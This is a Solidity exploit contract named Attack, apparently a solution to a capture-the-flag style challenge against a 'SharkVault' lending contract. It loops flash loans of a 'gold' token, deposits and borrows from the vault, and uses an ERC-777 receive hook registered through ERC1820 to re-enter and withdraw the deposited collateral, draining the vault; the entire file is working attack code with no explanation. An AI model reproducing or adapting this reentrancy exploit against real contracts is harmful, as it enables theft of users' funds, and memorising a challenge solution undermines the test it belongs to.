pragma solidity ^0.8.19;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC777Recipient.sol";
import {SharkVault} from "./SharkVault.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";


contract Attack is IERC3156FlashBorrower, IERC777Recipient{
    IERC3156FlashLender public lender = IERC3156FlashLender(0xfCb668c2108782AC6B0916032BD2aF5a1563E65D);
    SharkVault public sharkVault = SharkVault(0xdD88C9B924824f0e21DaFe866B11a24D393992D1);
    IERC20 public gold;
    IERC20 public seagold;

    IERC1820Registry public registry
        = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH
        = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;

    constructor() {
        gold = sharkVault.gold();
        seagold = sharkVault.seagold();

        registry.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this));
    }
   
    function attack() public {
        for(uint i=0; i<10; i++){
        lender.flashLoan(this, address(gold), 400e18, "");
        }
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        gold.approve(address(sharkVault), IERC20(gold).balanceOf(address(this)));
        sharkVault.depositGold(400e18);
        sharkVault.borrow(300e18);
        gold.approve(address(lender), 400e18);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override{
        sharkVault.withdrawGold(400e18);
    }
}